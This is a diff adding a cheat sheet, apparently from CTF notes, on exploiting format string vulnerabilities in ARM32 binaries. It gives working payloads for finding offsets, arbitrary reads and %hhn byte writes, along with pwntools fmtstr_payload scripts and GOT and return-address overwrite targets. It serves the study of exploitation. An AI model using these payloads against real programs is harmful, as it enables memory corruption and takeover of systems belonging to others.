@@ -524,6 +524,205 @@ python exploit.py REMOTE     # against the remote host
 
 
 
+# Format String Exploitation Cheat Sheet
+
+Practical workflow for FSB bugs, ARM32-focused (AArch32/ARMEL). Covers the bug, manual testing, the read/write primitives, and the pwntools automation. Notes where x86 differs.
+
+---
+
+## 0. The bug
+
+A `printf`-family call where the **format argument is user-controlled** and there's no separate format string:
+
+```c
+printf(buf);              // vulnerable
+fprintf(f, buf);
+sprintf(dst, buf);
+snprintf(dst, n, buf);
+syslog(pri, buf);         // easy to miss
+```
+
+In the decompiler: the format parameter (`r0` for `printf`, `r1` for `fprintf`) is loaded from user input rather than pointing at a `.rodata` literal.
+
+---
+
+## 1. The ARM calling-convention fact that governs everything
+
+AArch32 AAPCS passes the first four args in `r0–r3`. For `printf(fmt, ...)`:
+
+```
+r0 = format string
+r1 = 1st vararg   -> printf arg position 1
+r2 = 2nd vararg   -> position 2
+r3 = 3rd vararg   -> position 3
+[stack] = 4th vararg onward -> position 4, 5, 6, ...
+```
+
+A variadic function spills `r1–r3` into the stack save area to build its `va_list`. Consequence: `%1$`–`%3$` read the spilled registers (often nil/garbage); your controllable **stack** data starts appearing around position 4+. On x86 everything is on the stack from position 1 — so ARM effectively offsets your counting by the three register slots. Just count to your marker; the index already reflects this.
+
+---
+
+## 2. Manual testing — find your offset
+
+Send a marker plus a sweep and see where it lands:
+
+```
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+```
+
+Look for `0x41414141` in the output. Its position N = the arg index of your buffer.
+
+Faster / deterministic — probe positions directly with `%N$p` instead of hand-counting:
+
+```python
+for i in range(1, 60):
+    io = start()
+    io.sendlineafter(b'prompt', b'AAAA' + f'%{i}$p'.encode())
+    if b'0x41414141' in io.recvline():
+        log.success('offset = %d', i); break
+    io.close()
+```
+
+Use `AAAABBBB` (8-byte marker) to catch alignment splits — a misaligned buffer shows `0x41414141`/`0x42424242` straddling two positions.
+
+**If the marker never appears anywhere (sweep to ~150):** your input is probably **not on the stack** (heap or global/BSS). The self-reference `%n` trick needs a stack-resident copy — go back to the decompiler and confirm where the buffer lives before proceeding.
+
+---
+
+## 3. Read primitives
+
+| Specifier | Effect |
+|---|---|
+| `%p` / `%x` | Print a stack word (leak) — walk with many to dump the stack |
+| `%N$p` | **Direct access:** read arg N without padding through earlier ones |
+| `%N$s` | Deref the pointer at N and print as string (**arbitrary read**) |
+
+**Read vs. pointer discriminator** (the gotcha): `%N$c`/`%N$p` print the *value* at slot N; `%N$s` *derefs* it. If `%N$p` shows a small value like `0x4e`, slot N **holds a byte** (`'N'`), not a pointer. If `%N$p` shows a real pointer and `%N$s` prints your target string, slot N **points at** it — that's your write slot.
+
+**Harvest leaks** by classifying `%N$p` results:
+- high stack-range value → stack address
+- `.text`/code pointer → subtract known offset → **PIE base**
+- libc pointer (`__libc_start_main+X` return, or a `0xfbad....` FILE flags word nearby) → **libc base**
+
+---
+
+## 4. Write primitive: `%n` family
+
+`%n` writes the **count of characters printed so far** to the pointer at that arg position. Width variants limit the write size:
+
+| Specifier | Writes |
+|---|---|
+| `%n` | 4 bytes (full int) |
+| `%hn` | 2 bytes (short) |
+| `%hhn` | **1 byte** |
+
+**Controlling the value = controlling how much you print.** `%<W>c` prints one char padded to a field width of `W` → emits `W` characters → the counter reaches `W`.
+
+- Write byte value `B` (1–255): `%Bc` before the `%hhn`.
+- Write `0x00`: `%256c` (wraps: `256 & 0xFF = 0`).
+- If a prefix already printed `P` chars: use `%(B-P)c` so the cumulative total is `B`.
+
+The field-width number you type **equals** the output-character count **equals** the value written. That's the whole mechanism.
+
+---
+
+## 5. Worked one-byte example (what we did)
+
+Goal: flip a byte from `'N'` (`0x4E`) to `'Y'` (`0x59` = **89**), where a **pointer to the N already sits on the stack**.
+
+**Recon:**
+```
+%5$p   ->  a real pointer (not 0x4e)     : slot 5 is a pointer
+%5$s   ->  prints "N"                    : it points AT the N
+```
+
+**Exploit (manual):**
+```
+%89c%5$hhn
+```
+- `%89c` prints 89 chars → counter = 89
+- `%5$hhn` writes `89 = 0x59 = 'Y'` to `*(slot 5)`
+
+One input, no leak, ASLR-immune — because the program itself resolves slot 5's pointer live every run. This is the right tool when a **pointer to the target already exists on the stack**.
+
+---
+
+## 6. The same write via pwntools
+
+`fmtstr_payload` works differently: it **embeds the target address in your own buffer** and writes through that. So it needs (a) the literal target address and (b) your buffer's offset — it can *not* reuse an existing stack pointer.
+
+```python
+from pwn import *
+context.update(arch='arm', endian='little')
+
+payload = fmtstr_payload(offset, {target_addr: 0x59}, write_size='byte')
+io.sendlineafter(b'prompt', payload)
+print(repr(payload))     # inspect what it built
+```
+
+| Arg | Meaning |
+|---|---|
+| `offset` | The `%N$` index where **your buffer's first word** appears (from step 2). Anchor, not the write slot. |
+| `{addr: value}` | Write `value` to `addr`. Multi-byte handled automatically. |
+| `write_size` | `'byte'`=`%hhn`, `'short'`=`%hn` (usual sweet spot for full addresses), `'int'`=`%n`. |
+
+**Why the offset differs from the manual index:** `offset` is your *buffer's* anchor; pwntools then adds the words its own `%<W>c`/padding prefix occupies to place the address word, so the emitted `$` index shifts. In our case `offset=2` produced `%5$hhn` (2 + 3 prefix/alignment words = 5) — byte-identical to the manual payload, reached via a different coordinate system. Find `offset` empirically (where your marker lands), pass it, and let pwntools compute the final index. Always `print(repr(payload))` to verify.
+
+**When to use which:**
+- **Manual `%Bc%N$hhn`** — writing through a pointer **already on the stack** (randomized target, single input). `fmtstr_payload` can't express this.
+- **`fmtstr_payload`** — writing a **known/static address** you supply yourself (GOT overwrite, global in a no-PIE binary), especially multi-byte writes where it handles the `%hhn` chunking, field-width bumps, and aligned address block for you.
+
+---
+
+## 7. Mitigations — check before building a `%n` chain
+
+Run `checksec`. Each affects the write path:
+
+| Finding | Impact |
+|---|---|
+| **Partial RELRO** | GOT writable → **GOT overwrite** is the clean target |
+| **Full RELRO** | GOT read-only → pivot to saved **LR** on stack, `.fini_array`, exit handlers |
+| **`__printf_chk` in imports** (FORTIFY) | `%n` in a writable-segment format usually **aborts**; non-contiguous `%N$` rejected. Reads still work; writes via `%n` often dead — confirm before investing |
+| **PIE** | GOT/`.text` targets need a leak first |
+
+---
+
+## 8. Write targets, rough priority
+
+GOT entry of a function called **after** the vulnerable `printf` (so the patched pointer is actually used) → saved **LR** on the stack → `.fini_array` / `__stack_chk_fail` GOT → (older glibc only) `__malloc_hook`/`__free_hook`.
+
+---
+
+## 9. Multi-byte writes (full address)
+
+- Break the target value into byte or short chunks; write **ascending** positions with `%hhn`/`%hn`.
+- Between chunks, raise the cumulative count with more `%Wc` padding to reach each successive target value.
+- Place the **address block at the end** of the format string, 4-byte aligned, so `%N$` indices are deterministic. Pack with `p32`.
+- Let pwntools do all of this: `fmtstr_payload(offset, {addr: value}, write_size='short')`.
+
+---
+
+## 10. ARM-specific placement gotchas
+
+- **Alignment:** embedded address words must be 4-byte aligned or `%N$` points at a split of two addresses. Put them at the buffer tail.
+- **Endianness:** ARMEL (little) is typical — `p32` + `context.endian`. ARMEB flips address byte order.
+- **Thumb bit:** any code address you'll branch to needs bit 0 set (`addr | 1`).
+- **ASLR / same-session rule:** a leaked randomized address (stack/PIE/libc) is valid **only within the process that produced it**. Leak and write in one session — a second run re-randomizes. Only static (no-PIE) targets survive across runs and can be hardcoded from recon.
+
+---
+
+## Quick workflow
+
+```
+1. Spot user-controlled format arg in decompiler
+2. AAAA + %p sweep (or %N$p loop) -> find offset (marker index)
+3. %N$p / %N$s -> classify pointers, get PIE/libc/stack bases
+4. checksec -> pick writable target, confirm %n not FORTIFY-blocked
+5. Pointer already on stack?  -> manual %Bc%N$hhn
+   Supplying a known address?  -> fmtstr_payload(offset, {addr: val}, write_size=...)
+6. Ensure overwritten function is called AFTER the printf
+7. Fire; recvall(timeout=2) or interactive()
+```
 
 
 
